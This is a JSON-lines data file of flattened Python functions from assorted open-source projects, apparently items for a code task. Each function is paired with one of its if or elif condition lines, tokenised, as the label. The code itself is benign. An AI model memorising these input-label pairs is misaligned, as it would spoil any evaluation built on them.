{"input": "def replace(self, state): if state.key in self._dict: try: existing = self._dict[state.key] except KeyError: # catch gc removed the key after we just checked for it pass else: if existing is not state: self._manage_removed_state(existing) else: return self._dict[state.key] = state self._manage_incoming_state(state)", "label": "if existing is not state :"}
{"input": "def _line_generator(fh, skip_blanks=False, strip=True): for line in fh: if strip: line = line.strip() skip = False if skip_blanks: skip = line.isspace() or not line if not skip: yield line", "label": "if strip :"}
{"input": "def _get_workers_with_max_size(worker_to_size): \"\"\"Get workers with maximal size\"\"\" max_workers = set() max_size = 0 for w, size in worker_to_size.items(): if size > max_size: max_size = size max_workers = {w} elif size == max_size: max_workers.add(w) max_workers.difference_update([None]) return max_size, list(max_workers)", "label": "if size > max_size :"}
{"input": "def parse(self): while 1: l = self.f.readline() if not l: return l = l.strip() if l.startswith(\"[\"): self.parse_uuid(l) elif l.startswith(\"interface\") or l.startswith(\"dispinterface\"): self.parse_interface(l) elif l.startswith(\"coclass\"): self.parse_coclass(l)", "label": "elif l . startswith ( \"coclass\" ) :"}
{"input": "def check_source_unit(self, source, unit): \"\"\"Check source string.\"\"\" rules = [FLAG_RULES[flag] for flag in unit.all_flags if flag in FLAG_RULES] if not rules: return False found = set() for regexp, is_position_based in rules: for match in regexp.finditer(source[0]): if is_position_based(match[1]): found.add((match.start(0), match.end(0))) if len(found) >= 2: return True return False", "label": "if len ( found ) >= 2 :"}
{"input": "def parse_exprlist(self): list = [] while TRUE: self.reader.skip_white() c = self.reader.peek() if c != '\"' and self.ends_excmds(c): break node = self.parse_expr() viml_add(list, node) return list", "label": "if c != '\"' and self . ends_excmds ( c ) :"}
{"input": "def can_see_ban_details(request, profile): if request.user.is_authenticated: if request.user_acl[\"can_see_ban_details\"]: from .bans import get_user_ban return bool(get_user_ban(profile, request.cache_versions)) return False return False", "label": "if request . user_acl [ \"can_see_ban_details\" ] :"}
{"input": "def mouse_move(self, ips, x, y, btn, **key): if ips.roi == None: return lim = 5.0 / key[\"canvas\"].get_scale() if btn == None: self.cursor = wx.CURSOR_CROSS if ips.roi.snap(x, y, ips.cur, lim) != None: self.cursor = wx.CURSOR_HAND elif btn == 1: if self.curobj: ips.roi.draged(self.odx, self.ody, x, y, ips.cur, self.curobj) ips.update() self.odx, self.ody = x, y", "label": "if ips . roi . snap ( x , y , ips . cur , lim ) != None :"}
{"input": "def evex_mask_dest_reg_only(ii): # optional imm8 i, m, xyz = 0, 0, 0 for op in _gen_opnds(ii): if op_mask_reg(op): m += 1 elif op_xmm(op) or op_ymm(op) or op_zmm(op): xyz += 1 elif op_imm8(op): i += 1 else: return False return m == 1 and xyz > 0 and i <= 1", "label": "elif op_xmm ( op ) or op_ymm ( op ) or op_zmm ( op ) :"}
{"input": "def encode_datetime(self, dt, state): fmt = self.options.datetime_format is_iso = not fmt or fmt == \"iso\" if is_iso: if dt.microsecond == 0: fmt = \"%Y-%m-%dT%H:%M:%S%z\" else: fmt = \"%Y-%m-%dT%H:%M:%S.%f%z\" s = dt.strftime(fmt) if is_iso and s.endswith(\"-00:00\") or s.endswith(\"+00:00\"): s = s[:-6] + \"Z\" # Change UTC to use 'Z' notation self.encode_string(s, state)", "label": "if dt . microsecond == 0 :"}
{"input": "def main(config): with PathManager.open(config[\"infile\"], \"r\") as fin, PathManager.open( config[\"outfile\"], \"w\" ) as fout: for line in fin.readlines(): if \"persona\" in line: continue first_space = line.index(\" \") first_tab = line.index(\"\\t\") candidate = line[first_space + 1 : first_tab] fout.write(candidate + \"\\n\")", "label": "if \"persona\" in line :"}
{"input": "def compact_repr(record): parts = [] for key in record.__attributes__: value = getattr(record, key) if not value: continue if isinstance(value, list): value = HIDE_LIST elif key == FEATS: value = format_feats(value) else: value = repr(value) value = capped_str(value) parts.append(\"%s=%s\" % (key, value)) return \"%s(%s)\" % (record.__class__.__name__, \", \".join(parts))", "label": "elif key == FEATS :"}
{"input": "def make_chain(word): which = 1 while True: songs = find_songs_that_start_with_word(word) if len(songs) > 0: song = random.choice(songs) print(which, song[\"name\"] + \" by \" + song[\"artists\"][0][\"name\"]) which += 1 word = song[\"name\"].lower().split()[-1] else: break", "label": "if len ( songs ) > 0 :"}
{"input": "def set_break(self, filename, lineno, temporary=False, cond=None, funcname=None): if isinstance(funcname, str): if filename == __file__: globals_ = globals() else: module = importlib.import_module(filename[:-3]) globals_ = module.__dict__ func = eval(funcname, globals_) code = func.__code__ filename = code.co_filename lineno = code.co_firstlineno funcname = code.co_name res = super(Bdb, self).set_break( filename, lineno, temporary=temporary, cond=cond, funcname=funcname ) if isinstance(res, str): raise BdbError(res) return res", "label": "if filename == __file__ :"}
{"input": "def __init__(self, shapefile=None, shapeType=POINT, autoBalance=1): self.autoBalance = autoBalance if not shapefile: Writer.__init__(self, shapeType) elif is_string(shapefile): base = os.path.splitext(shapefile)[0] if os.path.isfile(\"%s.shp\" % base): r = Reader(base) Writer.__init__(self, r.shapeType) self._shapes = r.shapes() self.fields = r.fields self.records = r.records()", "label": "if os . path . isfile ( \"%s.shp\" % base ) :"}
{"input": "def test_env_not_set(self): with mock.patch.dict(\"os.environ\"): if self.env_name in os.environ: del os.environ[self.env_name] self.assertEqual(helper.get_xdg_env(self.env_name, self.default), self.default)", "label": "if self . env_name in os . environ :"}
{"input": "def selection_only(self): selection_only = False sel = self.sel() if (self.context == \"selection\" or self.context == \"both\") and len(sel): # if multiple lines, always true if len(sel) > 1: selection_only = True # check threshold elif self.threshold and not sel[0].empty(): text = self.view.substr(sel[0]) match = re.search(self.threshold, text) if match: selection_only = True # no valid selection else: selection_only = False return selection_only", "label": "if match :"}
{"input": "def __call__(self, rule, param): p, g = param.data, param.grad if p is None or g is None: return with chainer.using_device(param.device): xp = param.device.xp sign = xp.sign(p) if xp is cuda.cupy: kernel = cuda.elementwise(\"T s, T decay\", \"T g\", \"g += decay * s\", \"lasso\") kernel(sign, self.rate, g) else: g += self.rate * sign", "label": "if xp is cuda . cupy :"}
{"input": "def map_packages(shutit_pexpect_session, package_str, install_type): res = \"\" for package in package_str.split(): map_package_res = map_package(shutit_pexpect_session, package, install_type) if map_package_res == \"\": return res res += \" \" + map_package_res return res", "label": "if map_package_res == \"\" :"}
{"input": "def get_opnd_types_short(ii): types = [] for op in _gen_opnds(ii): if op.oc2: types.append(op.oc2) elif op_luf_start(op, \"GPRv\"): types.append(\"v\") elif op_luf_start(op, \"GPRz\"): types.append(\"z\") elif op_luf_start(op, \"GPRy\"): types.append(\"y\") else: die(\"Unhandled op type {}\".format(op)) return types", "label": "elif op_luf_start ( op , \"GPRy\" ) :"}
{"input": "def _process_archive(self, archive_stream, subtitle): for file_name in archive_stream.namelist(): if file_name.lower().endswith((\".srt\", \".sub\")): logger.info(\"Found subtitle file %r\", file_name) subtitle.content = fix_line_ending(archive_stream.read(file_name)) if subtitle.is_valid(): return", "label": "if file_name . lower ( ) . endswith ( ( \".srt\" , \".sub\" ) ) :"}
{"input": "def truncate(self, size=None): # type: (Optional[int]) -> int # Inefficient, but I don't know if truncate is possible with ftp with self._lock: if size is None: size = self.tell() with self.fs.openbin(self.path) as f: data = f.read(size) with self.fs.openbin(self.path, \"w\") as f: f.write(data) if len(data) < size: f.write(b\"\\0\" * (size - len(data))) return size", "label": "if len ( data ) < size :"}
{"input": "def wakeup(self): try: if self.wm_state() == \"iconic\": self.wm_withdraw() self.wm_deiconify() self.tkraise() self.focused_widget.focus_set() except TclError: # This can happen when the window menu was torn off. # Simply ignore it. pass", "label": "if self . wm_state ( ) == \"iconic\" :"}
{"input": "def locus_parser(self): line = self.stream.readline() while line != \"\": line = line.rstrip() match = re.match(\" Locus: (.+)\", line) if match is not None: locus = match.group(1) alleles, table = _read_allele_freq_table(self.stream) return locus, alleles, table line = self.stream.readline() self.done = True raise StopIteration", "label": "if match is not None :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_content(d.getPrefixedString()) continue if tt == 18: self.set_blob_key(d.getPrefixedString()) continue if tt == 24: self.set_width(d.getVarInt32()) continue if tt == 32: self.set_height(d.getVarInt32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 32 :"}
{"input": "def concat_kernel_sources(self): func_sources = OrderedDict() for kernel in self.kernels: for func_name, source in kernel.func_sources.items(): if func_name in func_sources: assert func_sources[func_name] == source else: func_sources[func_name] = source self.generate_top_source() self.generate_exec_source() self.generate_init_source() combined_source = ( \"\".join(self.header_sources.values()) + \"\\n\".join(func_sources.values()) + \"\".join(self.footer_sources.values()) ) return combined_source", "label": "if func_name in func_sources :"}
{"input": "def parseUnderindentTag(self, s): tag = self.underindentEscapeString s2 = s[len(tag) :] # To be valid, the escape must be followed by at least one digit. i = 0 while i < len(s2) and s2[i].isdigit(): i += 1 if i > 0: n = int(s2[:i]) # Bug fix: 2012/06/05: remove any period following the count. # This is a new convention. if i < len(s2) and s2[i] == \".\": i += 1 return n, s2[i:] else: return 0, s", "label": "if i < len ( s2 ) and s2 [ i ] == \".\" :"}
{"input": "def load(self, data): ckey = None for key, val in _rx_cookie.findall(data): if key.lower() in _c_keys: if ckey: self[ckey][key] = _unquote(val) elif key[0] == \"$\": # RFC2109: NAMEs that begin with $ are reserved for other uses # and must not be used by applications. continue else: self[key] = _unquote(val) ckey = key", "label": "elif key [ 0 ] == \"$\" :"}
{"input": "def load_cases(full_path): all_test_data = json.load(open(full_path), object_pairs_hook=OrderedDict) for test_data in all_test_data: given = test_data[\"given\"] for case in test_data[\"cases\"]: if \"result\" in case: test_type = \"result\" elif \"error\" in case: test_type = \"error\" elif \"bench\" in case: test_type = \"bench\" else: raise RuntimeError(\"Unknown test type: %s\" % json.dumps(case)) yield (given, test_type, case)", "label": "if \"result\" in case :"}
{"input": "def delete(self): if not self.force and not self.exists(): return [] cmd = [\"delete\"] if self.filename: cmd.append(\"--filename=\" + self.filename) else: if not self.resource: self.module.fail_json(msg=\"resource required to delete without filename\") cmd.append(self.resource) if self.name: cmd.append(self.name) if self.label: cmd.append(\"--selector=\" + self.label) if self.all: cmd.append(\"--all\") if self.force: cmd.append(\"--ignore-not-found\") return self._execute(cmd)", "label": "if not self . resource :"}
{"input": "def validate_latex_theme_options(app: Sphinx, config: Config) -> None: for key in list(config.latex_theme_options): if key not in Theme.UPDATABLE_KEYS: msg = __(\"Unknown theme option: latex_theme_options[%r], ignored.\") logger.warning(msg % (key,)) config.latex_theme_options.pop(key)", "label": "if key not in Theme . UPDATABLE_KEYS :"}
{"input": "def connectionLost(self, reason): if self.factory.debug: self.log.info( \"WampRawSocketProtocol: connection lost: reason = '{0}'\".format(reason) ) try: wasClean = isinstance(reason.value, ConnectionDone) self._session.onClose(wasClean) except Exception as e: # silently ignore exceptions raised here .. if self.factory.debug: self.log.info( \"WampRawSocketProtocol: ApplicationSession.onClose raised ({0})\".format( e ) ) self._session = None", "label": "if self . factory . debug :"}
{"input": "def parse(filename): dead_links = [] with open(filename, \"r\") as file_: for line in file_.readlines(): res = reference_line.search(line) if res: if not exists(res.group(1)): dead_links.append(res.group(1)) return dead_links", "label": "if res :"}
{"input": "def is_speaker_at_session(self, session_id): try: session = ( Session.query.filter(Session.speakers.any(Speaker.user_id == self.id)) .filter(Session.id == session_id) .one() ) if session: return True else: return False except MultipleResultsFound: return False except NoResultFound: return False", "label": "if session :"}
{"input": "def _validate_deployment_name(namespace): # If missing,try come out with a name associated with the template name if namespace.deployment_name is None: template_filename = None if namespace.template_file and os.path.isfile(namespace.template_file): template_filename = namespace.template_file if namespace.template_uri and urlparse(namespace.template_uri).scheme: template_filename = urlsplit(namespace.template_uri).path if template_filename: template_filename = os.path.basename(template_filename) namespace.deployment_name = os.path.splitext(template_filename)[0] else: namespace.deployment_name = \"deployment1\"", "label": "if namespace . template_file and os . path . isfile ( namespace . template_file ) :"}
{"input": "def mro(cls): if self.ready: if cls.__name__ == \"B1\": B2.__bases__ = (B1,) if cls.__name__ == \"B2\": B1.__bases__ = (B2,) return type.mro(cls)", "label": "if cls . __name__ == \"B2\" :"}
{"input": "def mark_shard_complete(): try: marker.refresh_from_db() except DeferIterationMarker.DoesNotExist: logger.warning( \"TaskMarker with ID: %s has vanished, cancelling task\", marker_id ) return marker.shards_complete += 1 marker.save() if marker.shards_complete == marker.shard_count: # Delete the marker if we were asked to if marker.delete_on_completion: marker.delete() defer(finalize, *args, _transactional=True, _queue=task_queue_name(), **kwargs)", "label": "if marker . delete_on_completion :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: length = d.getVarInt32() tmp = ProtocolBuffer.Decoder(d.buffer(), d.pos(), d.pos() + length) d.skip(length) self.add_public_certificate_list().TryMerge(tmp) continue if tt == 16: self.set_max_client_cache_time_in_second(d.getVarInt64()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 16 :"}
{"input": "def check_free(self, payload): # free_list: 'host=10.0.0.1', 'user=anonymous', 'host=10.0.0.7,user=test', ... for m in self.free_list: args = m.split(\",\", 1) for arg in args: k, v = arg.split(\"=\", 1) if payload[k] != v: break else: return True return False", "label": "if payload [ k ] != v :"}
{"input": "def getInnerText(element): # To mimic IE's 'innerText' property in the W3C DOM, we need to recursively # concatenate all child text nodes (depth first). text = \"\" child = element.firstChild while child: if child.nodeType == 1: text += getInnerText(child) elif child.nodeValue: text += child.nodeValue child = child.nextSibling return text", "label": "if child . nodeType == 1 :"}
{"input": "def get_complete_http(self): finished = [] c = self.connection.cursor() rows = c.execute(\"SELECT * FROM http WHERE complete=1\").fetchall() for row in rows: o = pickle.loads(row[\"object\"]) uadat = c.execute(\"SELECT * FROM ua WHERE parent_id=?\", (o.id,)).fetchall() for ua in uadat: uao = pickle.loads(ua[\"object\"]) if uao is not None and uao.source_code is not None and o.source_code: o.add_ua_data(uao) finished.append(o) c.close() return finished", "label": "if uao is not None and uao . source_code is not None and o . source_code :"}
{"input": "def get_tools(self, found_files): self.configured_by = {} runners = [] for tool_name in self.tools_to_run: tool = tools.TOOLS[tool_name]() config_result = tool.configure(self, found_files) if config_result is None: configured_by = None messages = [] else: configured_by, messages = config_result if messages is None: messages = [] self.configured_by[tool_name] = configured_by self.messages += messages runners.append(tool) return runners", "label": "if messages is None :"}
{"input": "def _yield_batches(self, keys): while self._shuffling_buffer.can_retrieve(): post_shuffled_row = self._shuffling_buffer.retrieve() if not isinstance(post_shuffled_row, dict): # This is for the case of batched reads. Here we restore back the # dictionary format of records post_shuffled_row = dict(zip(keys, post_shuffled_row)) self._batch_acc.append(post_shuffled_row) # Batch is ready? Collate and emmit if len(self._batch_acc) == self.batch_size: yield self.collate_fn(self._batch_acc) self._batch_acc = []", "label": "if len ( self . _batch_acc ) == self . batch_size :"}
{"input": "def action_open_file_filtered_dialog(self, widget): try: fname = self.main_window.open_file_dialog( title=\"Open file with Toga\", multiselect=False, file_types=[\"doc\", \"txt\"], ) if fname is not None: self.label.text = \"File to open:\" + fname else: self.label.text = \"No file selected!\" except ValueError: self.label.text = \"Open file dialog was canceled\"", "label": "if fname is not None :"}
{"input": "def validate_vars(env): \"\"\"Validate the PCH and PCHSTOP construction variables.\"\"\" if \"PCH\" in env and env[\"PCH\"]: if \"PCHSTOP\" not in env: raise SCons.Errors.UserError( \"The PCHSTOP construction must be defined if PCH is defined.\" ) if not SCons.Util.is_String(env[\"PCHSTOP\"]): raise SCons.Errors.UserError( \"The PCHSTOP construction variable must be a string: %r\" % env[\"PCHSTOP\"] )", "label": "if \"PCHSTOP\" not in env :"}
{"input": "def page_func(page_num): playlist = self._call_api( \"product/playlist\", show_id, { \"playListId\": playlist_id, \"pageNumber\": page_num, \"pageSize\": 30, \"sorts\": [{\"order\": \"DESC\", \"type\": \"SORTDATE\"}], }, ) for product in playlist.get(\"productList\", {}).get(\"products\", []): product_url = product.get(\"productUrl\", []).get(\"url\") if not product_url: continue yield self.url_result( product_url, \"Shahid\", str_or_none(product.get(\"id\")), product.get(\"title\") )", "label": "if not product_url :"}
{"input": "def forward(self, x): for rproj, conv in zip(self.residual_proj, self.conv_layers): residual = x x = conv(x) if self.skip_connections: if rproj is not None: residual = rproj(residual) x = (x + residual) * self.residual_scale return x", "label": "if rproj is not None :"}
{"input": "def _make_results_dir(self): r\"\"\"Makes directory for saving eqa-cnn-pretrain eval results.\"\"\" for s_type in [\"rgb\", \"seg\", \"depth\"]: dir_name = self.config.RESULTS_DIR.format(split=\"val\", type=s_type) if not os.path.isdir(dir_name): os.makedirs(dir_name)", "label": "if not os . path . isdir ( dir_name ) :"}
{"input": "def ignore_callback_errors(self, ignore): EventEmitter.ignore_callback_errors.fset(self, ignore) for emitter in self._emitters.values(): if isinstance(emitter, EventEmitter): emitter.ignore_callback_errors = ignore elif isinstance(emitter, EmitterGroup): emitter.ignore_callback_errors_all(ignore)", "label": "elif isinstance ( emitter , EmitterGroup ) :"}
{"input": "def cron_starter(*args: Any) -> None: _tz = self.conf.timezone if timezone is None else timezone while not self.should_stop: await self.sleep(cron.secs_for_next(cron_format, _tz)) if not self.should_stop: should_run = not on_leader or self.is_leader() if should_run: with self.trace(shortlabel(fun), trace_enabled=traced): await fun(*args)", "label": "if not self . should_stop :"}
{"input": "def rotateafter(self): if self.i != self.previ: i = self.parent.l.GetSelection() if i != wx.NOT_FOUND: self.parent.models[self.parent.l.GetString(i)].rot -= 5 * ( self.i - self.previ ) self.previ = self.i self.Refresh()", "label": "if i != wx . NOT_FOUND :"}
{"input": "def select(model, path, iter_, paths_): (paths, first) = paths_ value = model.get_value(iter_) if value is None: return not bool(paths) value = normalize_path(value) if value in paths: self.get_child().get_selection().select_path(path) paths.remove(value) if not first: self.get_child().set_cursor(path) # copy treepath, gets invalid after the callback first.append(path.copy()) else: for fpath in paths: if fpath.startswith(value): self.get_child().expand_row(path, False) return not bool(paths)", "label": "if fpath . startswith ( value ) :"}
{"input": "def read_logs_file(logs_path) -> List[V1Log]: if not os.path.exists(logs_path): return [] async with aiofiles.open(logs_path, mode=\"r\") as f: contents = await f.read() if contents: # Version handling if \".plx\" in logs_path: return V1Logs.read_csv(contents).logs # Legacy logs logs = V1Logs.read(contents) return logs.logs return []", "label": "if \".plx\" in logs_path :"}
{"input": "def adjust_sockets(self): variables = self.get_variables() for key in self.inputs.keys(): if key not in variables and key not in [\"Field\"]: self.debug( \"Input {} not in variables {}, remove it\".format(key, str(variables)) ) self.inputs.remove(self.inputs[key]) for v in variables: if v not in self.inputs: self.debug( \"Variable {} not in inputs {}, add it\".format( v, str(self.inputs.keys()) ) ) self.inputs.new(\"SvStringsSocket\", v)", "label": "if key not in variables and key not in [ \"Field\" ] :"}
{"input": "def run(self): while self.running: cmd = self.cmds.get() if cmd == \"stop\": break elif cmd == \"clear\": dead_tasks = [] for task in self.tasks: if task.status == Task.FINISH or task.status == Task.ERROR: dead_tasks.append(task) for dead_task in dead_tasks: self.tasks.remove(dead_task)", "label": "if cmd == \"stop\" :"}
{"input": "def process(self, node): self.vars = [] for child in node.childNodes: if child.nodeType == node.ELEMENT_NODE: child_text = get_xml_text(child) if child_text == \"\": # pragma:nocover continue if child.nodeName == \"Real\": for val in re.split(\"[\\t ]+\", child_text): self.vars.append(1.0 * eval(val)) return self", "label": "if child . nodeName == \"Real\" :"}
{"input": "def drain(self, fd): \"\"\"Make `fd` unreadable.\"\"\" while True: try: if not os.read(fd, 4096): return except OSError: e = sys.exc_info()[1] if e.args[0] == errno.EAGAIN: return raise", "label": "if e . args [ 0 ] == errno . EAGAIN :"}
{"input": "def parse(s): \"\"\"Parse the output below to create a new StopWatch.\"\"\" stopwatch = StopWatch() for line in s.splitlines(): if line.strip(): parts = line.split(None) name = parts[0] if name != \"%\": # ie not the header line rest = (float(v) for v in parts[2:]) stopwatch.times[parts[0]].merge(Stat.build(*rest)) return stopwatch", "label": "if line . strip ( ) :"}
{"input": "def delete(identifier, filenames=None, **kwargs): item = get_item(identifier) if filenames: if not isinstance(filenames, (set, list)): filenames = [filenames] for f in item.iter_files(): if f.name not in filenames: continue f.delete(**kwargs)", "label": "if not isinstance ( filenames , ( set , list ) ) :"}
{"input": "def _get_absolute_timeout(self, timeout): if timeout is Timeout.DEFAULT_TIMEOUT: return 5 # 5s is the default timeout for URLFetch. if isinstance(timeout, Timeout): if timeout.read is not timeout.connect: warnings.warn( \"URLFetch does not support granular timeout settings, \" \"reverting to total timeout.\", AppEnginePlatformWarning, ) return timeout.total return timeout", "label": "if timeout . read is not timeout . connect :"}
{"input": "def _add_annotation_to_imports( self, annotation: cst.Attribute ) -> Union[cst.Name, cst.Attribute]: key = get_full_name_for_node(annotation.value) if key is not None: # Don't attempt to re-import existing imports. if key in self.existing_imports: return annotation import_name = get_full_name_for_node(annotation.attr) if import_name is not None: AddImportsVisitor.add_needed_import(self.context, key, import_name) return annotation.attr", "label": "if import_name is not None :"}
{"input": "def unique_definitions(cls, defns): \"\"\"Takes a collection of defns and returns the unique list of defns.\"\"\" unique_defns = [] for defn in defns: for unique_defn in unique_defns: if unique_defn.path == defn.path and unique_defn == defn: # defn is already in the unique_defn list. break else: unique_defns.append(defn) return unique_defns", "label": "if unique_defn . path == defn . path and unique_defn == defn :"}
{"input": "def store_data(self, store_loc, **kwargs): \"\"\"Put arrays to store\"\"\" # print(store_loc) g = self.store.create_group(store_loc) for ( k, v, ) in kwargs.items(): # print(type(v[0])) # print(k) if type(v) == list: if len(v) != 0: if type(v[0]) is np.str_ or type(v[0]) is str: v = [a.encode(\"utf8\") for a in v] g.create_dataset(k, data=v, compression=self.clib, compression_opts=self.clev)", "label": "if type ( v ) == list :"}
{"input": "def connect_to_uri(self, uri, autoconnect=None, do_start=True): try: conn = self._check_conn(uri) if not conn: # Unknown connection, add it conn = self.add_conn(uri) if autoconnect is not None: conn.set_autoconnect(bool(autoconnect)) self.show_manager() if do_start: conn.open() return conn except Exception: logging.exception(\"Error connecting to %s\", uri) return None", "label": "if autoconnect is not None :"}
{"input": "def fn(n): while n < 3: if n < 0: yield \"less than zero\" elif n == 0: yield \"zero\" elif n == 1: yield \"one\" else: yield \"more than one\" n += 1", "label": "elif n == 0 :"}
{"input": "def closeEvent(self, e): self.common.log(\"MainWindow\", \"closeEvent\") if self.tabs.are_tabs_active(): # Open the warning dialog self.common.log(\"MainWindow\", \"closeEvent, opening warning dialog\") self.close_dialog.exec_() # Close if self.close_dialog.clickedButton() == self.close_dialog.accept_button: self.system_tray.hide() e.accept() # Cancel else: e.ignore() return self.system_tray.hide() e.accept()", "label": "if self . close_dialog . clickedButton ( ) == self . close_dialog . accept_button :"}
{"input": "def _stop_child_activities(self, name=None): \"\"\"Stop all child activities spawn by this activity.\"\"\" # Makes a list copy of items() to avoid dictionary size changed # during iteration for child_name, child in list(self._child_activity_map.items()): if name is not None and name != child_name: continue LOG.debug(\"%s: Stopping child activity %s \", self.name, child_name) if child.started: child.stop() self._child_activity_map.pop(child_name, None)", "label": "if name is not None and name != child_name :"}
{"input": "def add_libdirs(self, envvar, sep, fatal=False): v = os.environ.get(envvar) if not v: return for dir in str.split(v, sep): dir = str.strip(dir) if not dir: continue dir = os.path.normpath(dir) if os.path.isdir(dir): if not dir in self.library_dirs: self.library_dirs.append(dir) elif fatal: fail(\"FATAL: bad directory %s in environment variable %s\" % (dir, envvar))", "label": "elif fatal :"}
{"input": "def _serialize_list(array, previous): array = array or [] previous = previous or [] params = {} for i, v in enumerate(array): previous_item = previous[i] if len(previous) > i else None if hasattr(v, \"serialize\"): params[str(i)] = v.serialize(previous_item) else: params[str(i)] = _compute_diff(v, previous_item) return params", "label": "if hasattr ( v , \"serialize\" ) :"}
{"input": "def list_bucket(self, prefix=\"\", delimiter=\"\", headers=None, all_versions=False): self._check_bucket_uri(\"list_bucket\") bucket = self.get_bucket(headers=headers) if all_versions: return ( v for v in bucket.list_versions( prefix=prefix, delimiter=delimiter, headers=headers ) if not isinstance(v, DeleteMarker) ) else: return bucket.list(prefix=prefix, delimiter=delimiter, headers=headers)", "label": "if not isinstance ( v , DeleteMarker )"}
{"input": "def writeattr(stream, text): countdouble = text.count('\"') if countdouble: countsingle = text.count(\"'\") if countdouble <= countsingle: entities = {'\"': \"&quot;\"} quote = '\"' else: entities = {\"'\": \"&apos;\"} quote = \"'\" else: entities = {} quote = '\"' stream.write(quote) writetext(stream, text, entities) stream.write(quote)", "label": "if countdouble <= countsingle :"}
{"input": "def __gt__(self, other): if not isinstance(other, self.__class__): other = self.__class__(other) for part, value in self.parts: other_value = other[part] if part in LETTERS: cmp = self._cmp_part(value or \"z\", other_value or \"z\") else: cmp = self._cmp_part(value, other_value) if cmp == 0: continue else: return cmp == 1 return False", "label": "if cmp == 0 :"}
{"input": "def _concretize(self, n_cls, t1, t2, join_or_meet, translate): ptr_class = self._pointer_class() if n_cls is ptr_class: if isinstance(t1, ptr_class) and isinstance(t2, ptr_class): # we need to merge them return ptr_class(join_or_meet(t1.basetype, t2.basetype, translate)) if isinstance(t1, ptr_class): return t1 elif isinstance(t2, ptr_class): return t2 else: # huh? return ptr_class(BottomType()) return n_cls()", "label": "if isinstance ( t1 , ptr_class ) :"}
{"input": "def __init__(self, items=None): super().__init__() self.include_dirs = [] self._add_member(\"src_files\", FileList, \"C source files for VPI library\") self._add_member(\"include_files\", FileList, \"C include files for VPI library\") self._add_member( \"libs\", StringList, \"External libraries linked with the VPI library\" ) if items: self.load_dict(items) if self.include_files: self.include_dirs += unique_dirs(self.include_files) self.export_files = self.src_files + self.include_files", "label": "if self . include_files :"}
{"input": "def __init__(self, parent_element): if parent_element.items(): self.update(dict(parent_element.items())) for element in parent_element: if len(element) > 0: if element.tag == element[0].tag: aDict = ListParser(element) else: aDict = DictParser(element) if element.items(): aDict.update(dict(element.items())) self.update({element.tag: aDict}) elif element.items(): self.update({element.tag: dict(element.items())}) else: self.update({element.tag: element.text})", "label": "if element . items ( ) :"}
{"input": "def _shares_in_results(data): shares_in_device, shares_in_subdevice = False, False for plugin_name, plugin_result in data.iteritems(): if plugin_result[\"status\"] == \"error\": continue if \"device\" not in plugin_result: continue if \"disk_shares\" in plugin_result[\"device\"]: shares_in_device = True for subdevice in plugin_result[\"device\"].get(\"subdevices\", []): if \"disk_shares\" in subdevice: shares_in_subdevice = True break return shares_in_device, shares_in_subdevice", "label": "if \"disk_shares\" in subdevice :"}
{"input": "def decorator(self, command, *args, **kwargs): if required_keys: missing_keys = diff_keys(required_keys, command) if missing_keys: raise InvalidCommand( \"Command missing %s of required\" \" keys %s\" % (missing_keys, required_keys) ) return func(self, command, *args, **kwargs)", "label": "if missing_keys :"}
{"input": "def xml(self): out = [\"<spreadsheet>\"] for (x, y), cell in self.cells.items(): if hasattr(cell, \"xml\"): cellxml = cell.xml() else: cellxml = \"<value>%s</value>\" % escape(cell) out.append('<cell row=\"%s\" col=\"%s\">\\n %s\\n</cell>' % (y, x, cellxml)) out.append(\"</spreadsheet>\") return \"\\n\".join(out)", "label": "if hasattr ( cell , \"xml\" ) :"}
{"input": "def speed_tester_d(self, uid): if uid not in self._speed_tester_d: if self.mu: # TODO self._speed_tester_d[uid] = SpeedTester( self._config.get(\"speed_limit_per_user\", 0) ) else: self._speed_tester_d[uid] = SpeedTester( self._config.get(\"speed_limit_per_user\", 0) ) return self._speed_tester_d[uid]", "label": "if self . mu :"}
{"input": "def process_error(self, data): error = data.get(\"error\") if error: if error == \"access_denied\": raise AuthCanceled(self) else: raise AuthUnknownError(self, \"Jawbone error was {0}\".format(error)) return super().process_error(data)", "label": "if error == \"access_denied\" :"}
{"input": "def _do_test_fetch_result(self, results, remote): # self._print_fetchhead(remote.repo) self.assertGreater(len(results), 0) self.assertIsInstance(results[0], FetchInfo) for info in results: self.assertIsInstance(info.note, string_types) if isinstance(info.ref, Reference): self.assertTrue(info.flags) # END reference type flags handling self.assertIsInstance(info.ref, (SymbolicReference, Reference)) if info.flags & (info.FORCED_UPDATE | info.FAST_FORWARD): self.assertIsInstance(info.old_commit, Commit) else: self.assertIsNone(info.old_commit)", "label": "if isinstance ( info . ref , Reference ) :"}
{"input": "def init_ftp_server(self): if self.get_config(\"ftpd\", \"enabled\", False, boolean=True): accountfile = from_utf8_or_none(self.get_config(\"ftpd\", \"accounts.file\", None)) if accountfile: accountfile = abspath_expanduser_unicode(accountfile, base=self.basedir) accounturl = self.get_config(\"ftpd\", \"accounts.url\", None) ftp_portstr = self.get_config(\"ftpd\", \"port\", \"8021\") from allmydata.frontends import ftpd s = ftpd.FTPServer(self, accountfile, accounturl, ftp_portstr) s.setServiceParent(self)", "label": "if accountfile :"}
{"input": "def configured_request_log_handlers(config, prefix=\"query_log\", default_logger=None): \"\"\"Returns configured query loggers as defined in the `config`.\"\"\" handlers = [] for section in config.sections(): if section.startswith(prefix): options = dict(config.items(section)) type_ = options.pop(\"type\") if type_ == \"default\": logger = default_logger or get_logger() handler = ext.request_log_handler(\"default\", logger) else: handler = ext.request_log_handler(type_, **options) handlers.append(handler) return handlers", "label": "if type_ == \"default\" :"}
{"input": "def string(self): \"\"\"Returns a PlayString in string format from the Patterns values\"\"\" string = \"\" for item in self.data: if isinstance(item, (PGroup, GeneratorPattern)): string += item.string() elif isinstance(item, Pattern): string += ( \"(\" + \"\".join( [ (s.string() if hasattr(s, \"string\") else str(s)) for s in item.data ] ) + \")\" ) else: string += str(item) return string", "label": "elif isinstance ( item , Pattern ) :"}
